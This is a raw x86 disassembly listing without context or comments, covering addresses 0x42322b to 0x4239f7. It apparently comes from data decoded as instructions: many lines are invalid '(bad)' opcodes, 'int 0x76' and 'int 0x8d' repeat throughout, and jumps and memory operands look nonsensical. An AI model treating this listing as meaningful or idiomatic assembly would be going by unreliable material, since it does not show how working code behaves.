  42322b:	sub    BYTE PTR [ebx+0x13],dl
  42322e:	inc    ebx
  42322f:	jge    0x423207
  423231:	mov    ecx,ecx
  423233:	jbe    0x423272
  423235:	add    DWORD PTR [eax+0x76cd8080],0xb58dcdb5
  42323f:	cmp    eax,ebp
  423241:	sar    DWORD PTR [ebp-0x2c0fc46e],cl
  423247:	repnz sub BYTE PTR [ebx-0x2d],dl
  42324b:	xchg   DWORD PTR [esi+0x6d],esi
  42324e:	or     dh,BYTE PTR [esi+0x6d]
  423251:	int    0x76
  423253:	cmp    eax,0x1cd46d06
  423258:	int    0x76
  42325a:	mov    ch,0xcd
  42325c:	lea    esi,[ebp-0xfc43ac5]
  423262:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423268:	push   ebx
  423269:	rol    DWORD PTR [edi+0x760a9576],cl
  42326f:	xchg   ebp,eax
  423270:	int    0x76
  423272:	mov    ch,0xcd
  423274:	lea    esi,[ebp-0xfc43ac5]
  42327a:	shl    edx,cl
  42327c:	sub    bl,dl
  42327e:	mov    ebp,0xcdd35392
  423283:	lea    ebp,[ebp+0x76cd7d33]
  423289:	ins    DWORD PTR es:[edi],dx
  42328a:	inc    ebx
  42328b:	shr    DWORD PTR [edi],cl
  42328d:	pop    es
  42328e:	push   eax
  42328f:	inc    DWORD PTR [eax]
  423291:	add    al,al
  423293:	jmp    FWORD PTR [eax-0x326a8933]
  423299:	lea    ebp,[ebp+0x43]
  42329c:	jge    0x423274
  42329e:	xor    DWORD PTR [eax],eax
  4232a0:	(bad)  
  4232a1:	mov    bh,cl
  4232a3:	jbe    0x4232a2
  4232a5:	jo     0x423264
  4232a7:	stc    
  4232a8:	jl     0x42322a
  4232aa:	or     BYTE PTR [edx],0x76
  4232ad:	jne    0x42329b
  4232af:	sbb    cl,ch
  4232b1:	jbe    0x423328
  4232b3:	int    0x8d
  4232b5:	mov    ch,0xcd
  4232b7:	xchg   esi,eax
  4232b8:	mov    ch,0x3b
  4232ba:	or     al,0x3b
  4232bc:	cdq    
  4232bd:	shr    ebx,cl
  4232bf:	xchg   edx,eax
  4232c0:	shr    edx,cl
  4232c2:	sub    BYTE PTR [ebx+0x13],dl
  4232c5:	push   ecx
  4232c6:	mov    ch,cl
  4232c8:	jbe    0x4232c3
  4232ca:	int    0x8d
  4232cc:	stc    
  4232cd:	cmp    eax,ebp
  4232cf:	cmp    ecx,DWORD PTR [edi]
  4232d1:	shl    edx,cl
  4232d3:	sub    bl,dl
  4232d5:	mov    ebp,0xcdd35392
  4232da:	lea    esi,[ebp+0x43]
  4232dd:	shr    DWORD PTR [edi],cl
  4232df:	add    eax,0x80805300
  4232e4:	int    0x76
  4232e6:	stc    
  4232e7:	int    0x8d
  4232e9:	stc    
  4232ea:	cmp    eax,ebp
  4232ec:	cmp    ecx,DWORD PTR [edi]
  4232ee:	shl    edx,cl
  4232f0:	sub    bl,dl
  4232f2:	mov    ebp,0xcdd35392
  4232f7:	(bad)  
  4232f8:	std    
  4232f9:	inc    ebx
  4232fa:	shr    DWORD PTR [edi],cl
  4232fc:	add    eax,0x808053ea
  423301:	int    0x76
  423303:	stc    
  423304:	int    0x8d
  423306:	stc    
  423307:	cmp    eax,ebp
  423309:	cmp    ecx,DWORD PTR [edi]
  42330b:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423311:	push   ebx
  423312:	shr    esp,cl
  423314:	adc    al,0xcd
  423316:	lea    esi,[ebp+0x3bb596cd]
  42331c:	or     al,0x3b
  42331e:	cdq    
  42331f:	shr    ebx,cl
  423321:	xchg   edx,eax
  423322:	shr    edx,cl
  423324:	sub    BYTE PTR [ebx+0x13],dl
  423327:	xchg   ebx,edx
  423329:	int    0x8d
  42332b:	std    
  42332c:	inc    ebx
  42332d:	rol    DWORD PTR [edx-0x2893219],cl
  423333:	or     dh,BYTE PTR [esi-0x53]
  423336:	int    0x76
  423338:	jne    0x423344
  42333a:	jbe    0x42330c
  42333c:	ret    
  42333d:	dec    ecx
  42333e:	and    DWORD PTR [esi+0x45e60a35],eax
  423344:	leave  
  423345:	jbe    0x4232e4
  423347:	inc    ecx
  423348:	and    DWORD PTR [esi+0x4576cd35],eax
  42334e:	int    0x8d
  423350:	inc    ebp
  423351:	cmp    eax,ebp
  423353:	cmp    ecx,DWORD PTR [edi]
  423355:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42335b:	push   ebx
  42335c:	ror    DWORD PTR [edx],cl
  42335e:	jbe    0x4233b5
  423360:	int    0x76
  423362:	inc    ebp
  423363:	int    0x8d
  423365:	inc    ebp
  423366:	cmp    eax,ebp
  423368:	cmp    ecx,DWORD PTR [edi]
  42336a:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423370:	push   ebx
  423371:	ror    DWORD PTR [edx],cl
  423373:	jbe    0x42330a
  423375:	leave  
  423376:	jbe    0x4233b5
  423378:	dec    eax
  423379:	and    DWORD PTR [esi+0x1d76c935],eax
  42337f:	ret    0x8621
  423382:	xor    eax,0xcd4576cd
  423387:	lea    eax,[ebp+0x3b]
  42338a:	lds    edi,FWORD PTR [ebx]
  42338c:	psrlq  mm6,mm2
  42338f:	sub    bl,dl
  423391:	mov    ebp,0xcdd35392
  423396:	lea    ebp,[ebp+0x52f7d43]
  42339c:	push   ss
  42339d:	xchg   DWORD PTR [eax-0x6d241480],eax
  4233a3:	add    BYTE PTR [eax-0x32c27233],0x76
  4233aa:	cmp    eax,0x3b5596cd
  4233af:	jns    0x4233ec
  4233b1:	or     al,0xd3
  4233b3:	lods   eax,DWORD PTR ds:[esi]
  4233b4:	sub    bl,dl
  4233b6:	jmp    0x42334a
  4233b8:	push   ebx
  4233b9:	jge    0x423388
  4233bb:	jbe    0x42336a
  4233bd:	xor    edx,edx
  4233bf:	cmp    ebx,edx
  4233c1:	clc    
  4233c2:	add    cl,BYTE PTR [edx]
  4233c4:	jbe    0x42335b
  4233c6:	int    0x76
  4233c8:	sbb    eax,0x3b1d8dcd
  4233cd:	lds    edi,FWORD PTR [ebx]
  4233cf:	psrlq  mm6,mm2
  4233d2:	sub    bl,dl
  4233d4:	mov    ebp,0xcdd35392
  4233d9:	lea    edx,[ebp+0x16d87d43]
  4233df:	int    0x76
  4233e1:	sbb    eax,0x3b1d8dcd
  4233e6:	lds    edi,FWORD PTR [ebx]
  4233e8:	psrlq  mm7,QWORD PTR [ebp+0x28f2d392]
  4233ef:	push   ebx
  4233f0:	ror    DWORD PTR [edx],cl
  4233f2:	jbe    0x423389
  4233f4:	int    0x76
  4233f6:	cmp    eax,0x3b3d8dcd
  4233fb:	lds    edi,FWORD PTR [ebx]
  4233fd:	psrlq  mm7,QWORD PTR [ebp+0x28f2d392]
  423404:	push   ebx
  423405:	ror    ebp,cl
  423407:	lea    edx,[ebp+0xad3d12f]
  42340d:	jbe    0x4233a4
  42340f:	int    0x76
  423411:	inc    ebp
  423412:	int    0x8d
  423414:	inc    ebp
  423415:	cmp    eax,ebp
  423417:	cmp    ecx,DWORD PTR [edi]
  423419:	shl    edx,cl
  42341b:	sub    bl,dl
  42341d:	mov    ebp,0xcdd35392
  423422:	lea    edx,[ebp+0x52f7d43]
  423428:	pusha  
  423429:	xchg   edx,eax
  42342a:	add    BYTE PTR [eax+0xa9576cd],0x76
  423431:	or     eax,0x875576cd
  423436:	jbe    0x423408
  423438:	or     ah,dh
  42343a:	xchg   ebp,eax
  42343b:	or     dh,BYTE PTR [esi+0x6d]
  42343e:	pop    ebp
  42343f:	inc    ecx
  423440:	and    DWORD PTR [esi+0x5d760a35],eax
  423446:	leave  
  423447:	jbe    0x42345e
  423449:	cmp    DWORD PTR [ecx],esp
  42344b:	xchg   BYTE PTR ds:0xb23576c9,dh
  423451:	and    DWORD PTR [esi-0xe89f5cb],eax
  423457:	int    0x76
  423459:	xchg   ebp,eax
  42345a:	int    0x8d
  42345c:	xchg   ebp,eax
  42345d:	cmp    eax,ebp
  42345f:	cmp    ecx,DWORD PTR [edi]
  423461:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423467:	push   ebx
  423468:	ror    DWORD PTR [edx],cl
  42346a:	jbe    0x4234e9
  42346c:	int    0x6d
  42346e:	jmp    0x423476
  423470:	add    DWORD PTR [eax-0x36923280],0x7006
  42347a:	add    BYTE PTR [ebx],cl
  42347c:	and    DWORD PTR [esi-0x369232cb],eax
  423482:	push   es
  423483:	xchg   esp,eax
  423484:	add    BYTE PTR [eax],al
  423486:	add    bh,dh
  423488:	and    DWORD PTR [esi-0x329232cb],eax
  42348e:	ins    DWORD PTR es:[edi],dx
  42348f:	int    0x76
  423491:	icebp  
  423492:	int    0x8d
  423494:	icebp  
  423495:	cmp    eax,ebp
  423497:	cmp    ecx,DWORD PTR [edi]
  423499:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42349f:	push   ebx
  4234a0:	ror    ebp,cl
  4234a2:	lea    edi,[ebp+0x2f]
  4234a5:	rcl    ebx,1
  4234a7:	int    0x8d
  4234a9:	ins    DWORD PTR es:[edi],dx
  4234aa:	retf   0x8884
  4234ad:	or     DWORD PTR [esi-0x57],esi
  4234b0:	int    0x6d
  4234b2:	int    0x76
  4234b4:	icebp  
  4234b5:	int    0x8d
  4234b7:	icebp  
  4234b8:	cmp    ecx,DWORD PTR [edi]
  4234ba:	cmp    eax,ebp
  4234bc:	shl    edx,cl
  4234be:	sub    bl,dl
  4234c0:	mov    ebp,0xcdd35392
  4234c5:	lea    edi,[ebp+0x2f]
  4234c8:	rcl    ebx,1
  4234ca:	int    0x8d
  4234cc:	adc    eax,0x3b1596cd
  4234d1:	or     al,0x3b
  4234d3:	cdq    
  4234d4:	shr    ebx,cl
  4234d6:	xchg   edx,eax
  4234d7:	shr    edx,cl
  4234d9:	sub    BYTE PTR [ebx+0x13],dl
  4234dc:	xchg   ebx,edx
  4234de:	int    0x8d
  4234e0:	ins    DWORD PTR es:[edi],dx
  4234e1:	das    
  4234e2:	pop    ecx
  4234e3:	dec    esp
  4234e4:	mov    ch,cl
  4234e6:	push   es
  4234e7:	jo     0x4234e9
  4234e9:	add    BYTE PTR [eax],al
  4234eb:	int    0x17
  4234ed:	jo     0x4234ef
  4234ef:	add    BYTE PTR [eax],al
  4234f1:	cmp    eax,ebp
  4234f3:	cmp    ebx,DWORD PTR [ecx-0x2c6d422d]
  4234f9:	jmp    0x2fd3:0x87d25328
  423500:	pop    ecx
  423501:	lea    ebp,[ecx-0x72f682c5]
  423507:	test   eax,0x76ca6dcd
  42350c:	test   eax,0xcdf18dcd
  423511:	xchg   esi,eax
  423512:	icebp  
  423513:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423516:	cdq    
  423517:	shr    edx,cl
  423519:	sub    bl,dl
  42351b:	jmp    0x4234af
  42351d:	push   ebx
  42351e:	adc    ecx,ebp
  423520:	xchg   esi,eax
  423521:	jge    0x423552
  423523:	rcl    DWORD PTR [ebx],1
  423525:	int    0x96
  423527:	ins    DWORD PTR es:[edi],dx
  423528:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  42352f:	icebp  
  423530:	int    0x8d
  423532:	icebp  
  423533:	cmp    eax,ebp
  423535:	cmp    ecx,DWORD PTR [edi]
  423537:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42353d:	push   ebx
  42353e:	ror    ebp,cl
  423540:	lea    edi,[ebp+0x2f]
  423543:	rcl    ebx,1
  423545:	int    0x8d
  423547:	ins    DWORD PTR es:[edi],dx
  423548:	retf   0x8884
  42354b:	or     DWORD PTR [esi-0x57],esi
  42354e:	int    0x6d
  423550:	int    0x76
  423552:	icebp  
  423553:	int    0x8d
  423555:	icebp  
  423556:	cmp    eax,ebp
  423558:	sar    DWORD PTR [ebp-0x2cf0c46e],cl
  42355e:	repnz sub BYTE PTR [ebx-0x2d],dl
  423562:	int    0x8d
  423564:	jge    0x423595
  423566:	rcl    ebx,1
  423568:	int    0x8d
  42356a:	pop    ebp
  42356b:	int    0x96
  42356d:	pop    ebp
  42356e:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423571:	cdq    
  423572:	shr    ebx,cl
  423574:	xchg   edx,eax
  423575:	shr    edx,cl
  423577:	sub    BYTE PTR [ebx+0x13],dl
  42357a:	xchg   ebx,edx
  42357c:	int    0x8d
  42357e:	ins    DWORD PTR es:[edi],dx
  42357f:	das    
  423580:	pop    ecx
  423581:	dec    esp
  423582:	mov    ch,cl
  423584:	push   es
  423585:	xchg   esp,eax
  423586:	add    BYTE PTR [eax],al
  423588:	add    ch,cl
  42358a:	pop    ss
  42358b:	xchg   esp,eax
  42358c:	add    BYTE PTR [eax],al
  42358e:	add    BYTE PTR [ebx],bh
  423590:	lds    edi,FWORD PTR [ebx]
  423592:	cdq    
  423593:	sar    DWORD PTR [ebp+0x28ead392],cl
  423599:	push   ebx
  42359a:	rol    BYTE PTR [edi-0x72a6d02d],cl
  4235a0:	test   eax,0x8d097d3b
  4235a5:	test   eax,0x76ca6dcd
  4235aa:	test   eax,0xcdf18dcd
  4235af:	xchg   esi,eax
  4235b0:	icebp  
  4235b1:	cmp    ecx,DWORD PTR [ebx+edi*1]
  4235b4:	cdq    
  4235b5:	shr    edx,cl
  4235b7:	sub    bl,dl
  4235b9:	jmp    0x42354d
  4235bb:	push   ebx
  4235bc:	adc    ecx,ebp
  4235be:	xchg   esi,eax
  4235bf:	jge    0x4235f0
  4235c1:	rcl    DWORD PTR [ebx],1
  4235c3:	int    0x96
  4235c5:	ins    DWORD PTR es:[edi],dx
  4235c6:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  4235cd:	xor    eax,0x3b358dcd
  4235d2:	(bad)  
  4235d4:	(bad)
  4235d7:	sub    bl,dl
  4235d9:	mov    ebp,0xcdd35392
  4235de:	lea    ebx,[ebp-0x33]
  4235e1:	xchg   esi,eax
  4235e2:	pop    ebp
  4235e3:	cmp    ecx,DWORD PTR [ebx+edi*1]
  4235e6:	cdq    
  4235e7:	shr    ebx,cl
  4235e9:	xchg   edx,eax
  4235ea:	shr    edx,cl
  4235ec:	sub    BYTE PTR [ebx+0x13],dl
  4235ef:	das    
  4235f0:	rcl    ebx,1
  4235f2:	xchg   DWORD PTR [esi+0x7d],esi
  4235f5:	or     dh,BYTE PTR [esi+0x7d]
  4235f8:	int    0x76
  4235fa:	jge    0x4235c9
  4235fc:	lea    ecx,ds:0xb2f7d43
  423602:	(bad)  
  423603:	inc    DWORD PTR [eax]
  423605:	add    ch,cl
  423607:	jbe    0x423666
  423609:	int    0x8d
  42360b:	pop    ebp
  42360c:	cmp    ecx,DWORD PTR [edi]
  42360e:	shl    edx,cl
  423610:	sub    BYTE PTR [ebx],bh
  423612:	(bad)
  423615:	xchg   edx,eax
  423616:	push   ebx
  423617:	ror    ebp,cl
  423619:	lea    ecx,ds:0xcdd3d12f
  42361f:	lea    edx,[ebp-0x142cf3c5]
  423625:	xchg   edx,eax
  423626:	push   ebx
  423627:	ror    ebp,cl
  423629:	lea    edx,[ebp-0xd2cf0c5]
  42362f:	sub    BYTE PTR [ebx-0x2d],dl
  423632:	or     dh,BYTE PTR [esi+0x35]
  423635:	int    0x76
  423637:	popf   
  423638:	int    0x8d
  42363a:	popf   
  42363b:	cmp    ecx,DWORD PTR [edi]
  42363d:	shl    edx,cl
  42363f:	sub    BYTE PTR [ebx],bh
  423641:	(bad)
  423644:	xchg   edx,eax
  423645:	push   ebx
  423646:	ror    ebp,cl
  423648:	lea    ebx,[ebp+0x3b9d96cd]
  42364e:	or     al,0xd3
  423650:	jmp    0x4235e4
  423652:	cmp    ebx,DWORD PTR [ecx+0x5328ead3]
  423658:	adc    eax,DWORD PTR [edi+0x7d87358d]
  42365e:	xchg   DWORD PTR [ebp+0x558d0a55],ecx
  423664:	in     al,dx
  423665:	sbb    al,0xcd
  423667:	jbe    0x423606
  423669:	int    0x8d
  42366b:	popf   
  42366c:	cmp    eax,ebp
  42366e:	cmp    ecx,DWORD PTR [edi]
  423670:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423676:	push   ebx
  423677:	rol    DWORD PTR [edi+0x760a5576],cl
  42367d:	push   ebp
  42367e:	int    0x76
  423680:	popf   
  423681:	int    0x8d
  423683:	popf   
  423684:	cmp    eax,ebp
  423686:	sar    DWORD PTR [ebp-0x2cf0c46e],cl
  42368c:	repnz sub BYTE PTR [ebx-0x2d],dl
  423690:	int    0x8d
  423692:	lods   eax,DWORD PTR ds:[esi]
  423693:	xor    edi,DWORD PTR [ebp-0x33]
  423696:	jbe    0x423635
  423698:	int    0x96
  42369a:	popf   
  42369b:	cmp    eax,ebp
  42369d:	cmp    ebx,DWORD PTR [ecx-0x2cd7152d]
  4236a3:	mov    ebp,0xcdd25392
  4236a8:	xchg   esi,eax
  4236a9:	push   ebp
  4236aa:	das    
  4236ab:	rcl    edx,1
  4236ad:	inc    ebx
  4236ae:	shr    DWORD PTR [edi],cl
  4236b0:	pop    es
  4236b1:	adc    ebp,edi
  4236b3:	add    BYTE PTR [eax],al
  4236b5:	int    0x76
  4236b7:	stc    
  4236b8:	int    0x76
  4236ba:	stc    
  4236bb:	int    0x76
  4236bd:	std    
  4236be:	or     dh,BYTE PTR [esi+0x35]
  4236c1:	int    0x76
  4236c3:	mov    ch,cl
  4236c5:	lea    esp,ds:0x3b2596cd
  4236cb:	or     al,0xd3
  4236cd:	jmp    0x423661
  4236cf:	cmp    ebx,DWORD PTR [ecx-0x7eeefe33]
  4236d5:	add    BYTE PTR [eax+0x5328ead3],0x13
  4236dc:	jno    0x4236ab
  4236de:	lea    esp,[ebp-0x33]
  4236e1:	xchg   esi,eax
  4236e2:	cmp    ecx,DWORD PTR gs:[ebx+edi*1]
  4236e6:	cdq    
  4236e7:	shr    ebx,cl
  4236e9:	xchg   edx,eax
  4236ea:	shr    edx,cl
  4236ec:	sub    BYTE PTR [ebx+0x13],dl
  4236ef:	jno    0x4236be
  4236f1:	(bad)  
  4236f2:	stc    
  4236f3:	int    0x96
  4236f5:	stc    
  4236f6:	add    dh,dl
  4236f8:	xor    eax,0x993b0c3b
  4236fd:	shr    ebx,cl
  4236ff:	xchg   edx,eax
  423700:	shr    edx,cl
  423702:	sub    BYTE PTR [ebx+0x13],dl
  423705:	jno    0x423707
  423707:	jo     0x42371d
  423709:	int    0x8d
  42370b:	stc    
  42370c:	int    0x96
  42370e:	stc    
  42370f:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423712:	cdq    
  423713:	shr    ebx,cl
  423715:	xchg   edx,eax
  423716:	shr    edx,cl
  423718:	sub    BYTE PTR [ebx+0x13],dl
  42371b:	or     dh,BYTE PTR [esi+0x65]
  42371e:	inc    ebx
  42371f:	jge    0x423750
  423721:	add    eax,0x808080ab
  423726:	int    0x76
  423728:	stc    
  423729:	in     al,dx
  42372a:	(bad)  
  42372b:	int    0x96
  42372d:	or     dh,BYTE PTR gs:[esi-0x53]
  423731:	push   ecx
  423732:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423733:	lods   eax,DWORD PTR ds:[esi]
  423734:	int    0x8d
  423736:	lods   eax,DWORD PTR ds:[esi]
  423737:	shr    ebx,cl
  423739:	xchg   edx,eax
  42373a:	cmp    edi,DWORD PTR [ecx-0x2d]
  42373d:	lods   eax,DWORD PTR ds:[esi]
  42373e:	sub    BYTE PTR [ebx-0x2d],dl
  423741:	int    0x8d
  423743:	jne    0x42370f
  423745:	dec    esp
  423746:	or     DWORD PTR [ecx],0x8dcd304c
  42374c:	mov    ch,0xcd
  42374e:	lea    esi,[ebp+0x3bb596cd]
  423754:	or     al,0x3b
  423756:	cdq    
  423757:	shr    edx,cl
  423759:	sub    bl,dl
  42375b:	jmp    0x4236ef
  42375d:	push   ebx
  42375e:	adc    ecx,ebp
  423760:	xchg   esi,eax
  423761:	mov    ch,0x87
  423763:	jge    0x423732
  423765:	jbe    0x423714
  423767:	cmp    edx,ebp
  423769:	add    al,0xad
  42376b:	std    
  42376c:	add    al,0xea
  42376e:	std    
  42376f:	shr    ebx,cl
  423771:	sub    BYTE PTR [edi+0x3bd353d2],al
  423777:	leave  
  423778:	int    0x8d
  42377a:	std    
  42377b:	int    0x96
  42377d:	std    
  42377e:	shr    edx,cl
  423780:	xchg   edx,eax
  423781:	shr    ebx,cl
  423783:	sub    BYTE PTR [ebx-0x1d],dl
  423786:	cmp    ebx,ecx
  423788:	inc    ebx
  423789:	rcl    dh,cl
  42378b:	mov    ds:0xcd8876cd,eax
  423790:	lea    ebp,ds:0xcd2d96cd
  423796:	add    DWORD PTR [ecx],edx
  423798:	add    DWORD PTR [eax+0x3b0c3b80],0x92ebd399
  4237a2:	shr    edx,cl
  4237a4:	sub    BYTE PTR [ebx+0x13],dl
  4237a7:	jno    0x423776
  4237a9:	(bad)  
  4237aa:	stc    
  4237ab:	int    0x96
  4237ad:	stc    
  4237ae:	cmp    ecx,DWORD PTR [ebx+edi*1]
  4237b1:	cdq    
  4237b2:	shr    ebx,cl
  4237b4:	xchg   edx,eax
  4237b5:	shr    edx,cl
  4237b7:	sub    BYTE PTR [ebx+0x13],dl
  4237ba:	jno    0x4237bc
  4237bc:	(bad)  
  4237bd:	jne    0x4237bf
  4237bf:	jo     0x4237dd
  4237c1:	int    0x76
  4237c3:	or     dh,BYTE PTR gs:[esi+0x75]
  4237c7:	int    0x76
  4237c9:	xor    eax,0xcdfd760a
  4237ce:	jbe    0x4237cd
  4237d0:	cmp    ecx,ebx
  4237d2:	add    al,0xbd
  4237d4:	test   ah,dl
  4237d6:	xor    ecx,ebp
  4237d8:	jbe    0x42384f
  4237da:	int    0x14
  4237dc:	mov    ch,cl
  4237de:	jbe    0x423855
  4237e0:	int    0x84
  4237e2:	mov    BYTE PTR [ebx],bh
  4237e4:	jns    0x423821
  4237e6:	aad    0xd3
  4237e8:	lods   eax,DWORD PTR ds:[esi]
  4237e9:	sub    bl,dl
  4237eb:	repz xchg edx,eax
  4237ed:	push   ebx
  4237ee:	ror    ch,cl
  4237f0:	xchg   esi,eax
  4237f1:	jne    0x4237fd
  4237f3:	test   BYTE PTR [edx-0x33],cl
  4237f6:	jbe    0x4237f5
  4237f8:	add    al,0xd3
  4237fa:	test   BYTE PTR [edi*4-0x7d82bc7c],al
  423801:	xlat   BYTE PTR ds:[ebx]
  423802:	int    0x76
  423804:	std    
  423805:	cmp    ecx,ebx
  423807:	add    al,0xbd
  423809:	test   ah,dl
  42380b:	xor    ecx,ebp
  42380d:	jbe    0x423884
  42380f:	int    0x14
  423811:	mov    ch,cl
  423813:	jbe    0x42388a
  423815:	int    0x84
  423817:	mov    BYTE PTR [ebx],bh
  423819:	jns    0x423856
  42381b:	aad    0xd3
  42381d:	lods   eax,DWORD PTR ds:[esi]
  42381e:	sub    bl,dl
  423820:	repz xchg edx,eax
  423822:	push   ebx
  423823:	ror    ch,cl
  423825:	xchg   esi,eax
  423826:	jne    0x423832
  423828:	test   BYTE PTR [edx-0x33],cl
  42382b:	jbe    0x42382a
  42382d:	add    al,0xd3
  42382f:	test   BYTE PTR [edi*4-0x7d82bc7c],al
  423836:	xlat   BYTE PTR ds:[ebx]
  423837:	int    0x76
  423839:	jne    0x423845
  42383b:	jbe    0x42384a
  42383d:	int    0x76
  42383f:	mov    ch,0xcd
  423841:	lea    esi,[ebp+0xf3bc53b]
  423847:	shl    edx,cl
  423849:	sub    bl,dl
  42384b:	mov    ebp,0xcdd35392
  423850:	(bad)  
  423851:	stc    
  423852:	or     dh,BYTE PTR [esi+0x25]
  423855:	leave  
  423856:	jbe    0x423824
  423858:	imul   edi,DWORD PTR [ecx+0x69],0xb076c9d7
  42385f:	imul   edx,ebp,0x8d0a0c69
  423865:	gs adc bh,dl
  423868:	into   
  423869:	and    DWORD PTR [esi-0x32fad0cb],eax
  42386f:	add    BYTE PTR [eax+0xd96cd80],0xcd
  423876:	sar    DWORD PTR [ebx],cl
  423878:	lds    ecx,FWORD PTR [edx]
  42387a:	jbe    0x423829
  42387c:	rol    esi,cl
  42387e:	lods   eax,DWORD PTR ds:[esi]
  42387f:	xchg   edx,eax
  423880:	or     dh,BYTE PTR [esi-0x30]
  423883:	int    0xd3
  423885:	cmp    edi,DWORD PTR [ecx-0x2d]
  423888:	lods   eax,DWORD PTR ds:[esi]
  423889:	sub    BYTE PTR [ebx+0x76],dl
  42388c:	lods   eax,DWORD PTR ds:[esi]
  42388d:	retf   0x858c
  423890:	int3   
  423891:	das    
  423892:	imul   eax,DWORD PTR [eax+esi*1+0x1830201],0x592fbeeb
  42389d:	retf   
  42389e:	inc    ebx
  42389f:	rcl    esi,cl
  4238a1:	jle    0x423870
  4238a3:	jbe    0x42385a
  4238a5:	int    0x8d
  4238a7:	mov    ch,0xcd
  4238a9:	jbe    0x423860
  4238ab:	int    0x96
  4238ad:	mov    ch,0x3b
  4238af:	jns    0x4238ec
  4238b1:	or     al,0xd3
  4238b3:	lods   eax,DWORD PTR ds:[esi]
  4238b4:	sub    bl,dl
  4238b6:	jmp    0x42384a
  4238b8:	push   ebx
  4238b9:	jge    0x423888
  4238bb:	jbe    0x423922
  4238bd:	cmp    edi,DWORD PTR [ecx-0x2d]
  4238c0:	lods   eax,DWORD PTR ds:[esi]
  4238c1:	sub    BYTE PTR [ebx+0x76],dl
  4238c4:	lods   eax,DWORD PTR ds:[esi]
  4238c5:	cmp    edx,ebp
  4238c7:	xchg   DWORD PTR [ebp-0x33],edi
  4238ca:	jbe    0x42389c
  4238cc:	add    al,0xea
  4238ce:	std    
  4238cf:	add    al,0xad
  4238d1:	std    
  4238d2:	shr    ebx,cl
  4238d4:	sub    BYTE PTR [edi+0x3b1353f1],al
  4238da:	lock or cl,BYTE PTR [ebp-0x3105ed9b]
  4238e1:	and    DWORD PTR [esi-0x323329cb],eax
  4238e7:	jbe    0x42390e
  4238e9:	in     al,dx
  4238ea:	and    cl,ch
  4238ec:	jbe    0x4238e7
  4238ee:	int    0x8d
  4238f0:	stc    
  4238f1:	cmp    eax,ebp
  4238f3:	cmp    ecx,DWORD PTR [edi]
  4238f5:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4238fb:	push   ebx
  4238fc:	ror    ebp,cl
  4238fe:	(bad)  
  4238ff:	stc    
  423900:	int    0x96
  423902:	stc    
  423903:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423906:	cdq    
  423907:	shr    ebx,cl
  423909:	xchg   edx,eax
  42390a:	shr    edx,cl
  42390c:	sub    BYTE PTR [ebx+0x13],dl
  42390f:	inc    ebx
  423910:	jge    0x423941
  423912:	add    eax,0x80809223
  423917:	int    0x76
  423919:	or     eax,0xa886ccd
  42391e:	out    0xb5,al
  423920:	leave  
  423921:	jbe    0x423948
  423923:	mov    dl,0x21
  423925:	xchg   BYTE PTR ds:0x393576c9,dh
  42392b:	and    DWORD PTR [esi-0x6a8936cb],eax
  423931:	dec    ecx
  423932:	mov    al,ds:0x76c93586
  423937:	lods   eax,DWORD PTR ds:[esi]
  423938:	imul   esp,DWORD PTR [ecx],0x76c93586
  42393e:	and    ch,BYTE PTR gs:[ebx-0x7a]
  423942:	xor    eax,0xcd3d760a
  423947:	jbe    0x4238d1
  423949:	int    0x8d
  42394b:	lods   eax,DWORD PTR ds:[esi]
  42394c:	int    0x96
  42394e:	lods   eax,DWORD PTR ds:[esi]
  42394f:	cmp    ecx,DWORD PTR [ebx+edx*8]
  423952:	jmp    0x4238e6
  423954:	cmp    ebx,DWORD PTR [ecx+0x5328ead3]
  42395a:	adc    esi,DWORD PTR [ecx-0x33]
  42395d:	lea    edx,[ebp+0x3b9596cd]
  423963:	or     al,0xd3
  423965:	jmp    0x4238f9
  423967:	cmp    ebx,DWORD PTR [ecx-0x7eeefe33]
  42396d:	add    BYTE PTR [eax+0x5328ead3],0x13
  423974:	jno    0x423943
  423976:	lea    esp,[ebp-0x33]
  423979:	xchg   esi,eax
  42397a:	cmp    ecx,DWORD PTR gs:[ebx+edi*1]
  42397e:	cdq    
  42397f:	shr    ebx,cl
  423981:	xchg   edx,eax
  423982:	shr    edx,cl
  423984:	sub    BYTE PTR [ebx+0x13],dl
  423987:	jno    0x423956
  423989:	lea    esi,[ebp+0x3bb596cd]
  42398f:	or     al,0x3b
  423991:	cdq    
  423992:	shr    ebx,cl
  423994:	xchg   edx,eax
  423995:	shr    edx,cl
  423997:	sub    BYTE PTR [ebx+0x13],dl
  42399a:	jno    0x42399c
  42399c:	jo     0x4239b2
  42399e:	or     dh,BYTE PTR [esi+0x65]
  4239a1:	int    0x76
  4239a3:	mov    ch,cl
  4239a5:	lea    ebp,[ebp+0x3bad96cd]
  4239ab:	or     al,0xd3
  4239ad:	jmp    0x423941
  4239af:	cmp    ebx,DWORD PTR [ecx-0x7eeefe33]
  4239b5:	add    BYTE PTR [eax+0x5328ead3],0x13
  4239bc:	jno    0x42398b
  4239be:	lea    edx,[ebp+0x3b9596cd]
  4239c4:	or     al,0x3b
  4239c6:	cdq    
  4239c7:	shr    ebx,cl
  4239c9:	xchg   edx,eax
  4239ca:	shr    edx,cl
  4239cc:	sub    BYTE PTR [ebx+0x13],dl
  4239cf:	jno    0x42399e
  4239d1:	lea    esi,[ebp+0xb596cd]
  4239d7:	(bad)  
  4239d8:	cmp    eax,0x993b0c3b
  4239dd:	shr    ebx,cl
  4239df:	xchg   edx,eax
  4239e0:	shr    edx,cl
  4239e2:	sub    BYTE PTR [ebx+0x13],dl
  4239e5:	jno    0x4239e7
  4239e7:	jo     0x4239fd
  4239e9:	int    0x8d
  4239eb:	mov    ch,0xa
  4239ed:	jbe    0x42399c
  4239ef:	int    0x76
  4239f1:	mov    ch,0x3b
  4239f3:	or     al,0x3b
  4239f5:	jns    0x4239ca
  4239f7:	jmp    0x42398b
